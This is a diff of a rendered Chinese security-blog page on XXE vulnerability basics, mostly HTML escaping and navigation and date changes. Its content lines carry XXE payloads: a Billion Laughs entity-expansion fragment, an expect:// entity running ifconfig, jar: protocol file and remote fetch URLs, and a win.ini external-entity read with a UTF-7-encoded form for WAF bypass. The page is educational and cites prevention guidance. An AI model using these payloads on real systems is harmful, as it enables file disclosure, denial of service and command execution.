+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>XXE的拒绝服务攻击在高版本JDK中进行了缓解，JDK会检测实体嵌套：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/69bf1c6a1a2e6d4ed624bfb7af68ec17.png"></p>
 <h3 id="XXE协议支持"><a href="#XXE协议支持" class="headerlink" title="XXE协议支持"></a>XXE协议支持</h3><p>使用网上的一张图来描述：<br><img src="https://i.loli.net/2021/08/09/LhWV7beiMR8cpOq.png"><br>PHP中如果开启了expect支持可以进行RCE：</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY rce SYSTEM "expect://ifconfig"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY rce SYSTEM "expect://ifconfig"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>JAVA中因为JDK版本原因，gopher在JDK8移除、netdoc(netdoc:///tmp)在JDK9中移除。jar协议的使用方法：</p>
-<pre class="line-numbers language-html"><code class="language-html">local =&gt; jar:file:///var/myarchive.zip!/file.txt
-remote =&gt; jar:https://download.host.com/myarchive.zip!/file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html">local => jar:file:///var/myarchive.zip!/file.txt
+remote => jar:https://download.host.com/myarchive.zip!/file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>用jar协议外带数据：<br><img src="https://i.loli.net/2021/08/09/qUa7jxLB5AvMX4V.png"><br>利用jar协议下载临时文件：<br><img src="https://i.loli.net/2021/08/16/V2xt4RdsBUQAEie.png"><br>利用zip中不存在的文件引发报错，抛出临时文件路径(一般默认是用户temp下<code>C:\Users\&lt;user&gt;\AppData\Local\Temp</code>,Linux默认在容器temp)：<br><img src="https://i.loli.net/2021/08/16/bnmlHqNKrLFJ35y.png"><br>这是一个用来在传输中进行延时的脚本,通过<code>python x.py x.zip</code>使用(x.zip末尾添加00垃圾字符):</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys 
 <span class="token keyword">import</span> time 
@@ -757,13 +757,13 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
 <p>更多详情：<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p>
 <h2 id="0x06-XXE绕过"><a href="#0x06-XXE绕过" class="headerlink" title="0x06 XXE绕过"></a>0x06 XXE绕过</h2><p>这两种绕过同样是在<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">CSAWQual 2019-Web_Unagi</a>用到的<br>1.UTF-7编码<br>编码网页工具：<a target="_blank" rel="noopener" href="http://toolswebtop.com/text/process/decode/UTF-7">http://toolswebtop.com/text/process/decode/UTF-7</a><br>将POC转换为UTF-7编码：</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE users [
-&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" &gt;</span>]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" ></span>]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/361a5b90a7db17b4047fcf499545b1af.png"><br>编码结果：</p>
 <pre class="line-numbers language-xml"><code class="language-xml">+ADwAIQ-DOCTYPE users +AFs
 +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///C:/Windows/win.ini+ACI +AD4AXQA+-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>绕过WAF:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4f33d035f17ab95352749c1725a9007f.png"><br>在PhpSpreadsheet的<a target="_blank" rel="noopener" href="https://github.com/PHPOffice/PhpSpreadsheet/issues/771">issues</a>中也可以看到这样的XXE绕过方式：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/da7f7abba9d6687024d4bb018e5e5612.png"></p>
 <p>2.文件编码转换<br>将文件的编码转换为UTF16，网上大部分都是这种方法：</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">iconv</span> -f utf8 -t utf16 sample.xml<span class="token operator">&gt;</span>2.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">iconv</span> -f utf8 -t utf16 sample.xml<span class="token operator">></span>2.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8fcc98bb7888e96239a07151dbf53df1.png"></p>
 <h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/PHPOffice/PhpSpreadsheet/issues/771">PhpSpreadsheet XXE</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14774132.html">Java EXCEL XXE</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a target="_blank" rel="noopener" href="https://www.ajsafe.com/news/185.html">XXE漏洞原理及利用</a><br><a target="_blank" rel="noopener" href="https://gosecure.github.io/xxe-workshop/#7">Advanced XXE Exploitation</a><br><a target="_blank" rel="noopener" href="https://blog.noob.ninja/spilling-local-files-via-xxe-when/">本地DTD利用</a><br><a target="_blank" rel="noopener" href="https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5">微信XXE修复</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Billion_laughs_attack">XXE拒绝服务攻击Billion Laughs</a><br><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML 外部实体预防</a><br><a target="_blank" rel="noopener" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">利用本地 DTD 文件利用 XXE</a></p>
 <script>
@@ -809,7 +809,7 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yanghaoi.github.io/2021/10/08/xxe-lou-dong-ji-chu/">https://yanghaoi.github.io/2021/10/08/xxe-lou-dong-ji-chu/</a>
+                    <a href="https://yanghaoi.github.io/2021/10/06/xxe-lou-dong-ji-chu/">https://yanghaoi.github.io/2021/10/06/xxe-lou-dong-ji-chu/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1157,7 +1157,55 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/10/08/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/">
+                <a href="/2021/10/07/ssrf-lou-dong-ji-chu/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8e747a43120a59986fdbc8840ff6f6f1.jpg" class="responsive-img" alt="SSRF漏洞基础">
+                        
+                        <span class="card-title">SSRF漏洞基础</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            对SSRF漏洞的类型、原理、协议使用、限制绕过、攻击其他组件、常用的利用工具和方法等进行记录。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-07
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    基础漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">SSRF漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/05/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/">
                     <div class="card-image">
                         
                         <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8509b1add189e4272eea5a7df80740df.png" class="responsive-img" alt="Webgoat靶场调试环境配置">
@@ -1172,9 +1220,9 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1196,54 +1244,6 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
                     
                     <a href="/tags/IDEA/">
                         <span class="chip bg-color">IDEA</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/10/07/ssrf-lou-dong-ji-chu/">
-                    <div class="card-image">
-                        
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8e747a43120a59986fdbc8840ff6f6f1.jpg" class="responsive-img" alt="SSRF漏洞基础">
-                        
-                        <span class="card-title">SSRF漏洞基础</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            对SSRF漏洞的类型、原理、协议使用、限制绕过、攻击其他组件、常用的利用工具和方法等进行记录。
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-07
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    基础漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">SSRF漏洞</span>
                     </a>
                     
                 </div>
@@ -1429,7 +1429,7 @@ org<span class="token punctuation">.</span>xml<span class="token punctuation">.<
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">22.4k</span>&nbsp;字
+                class="white-color">22.2k</span>&nbsp;字
             
             
             
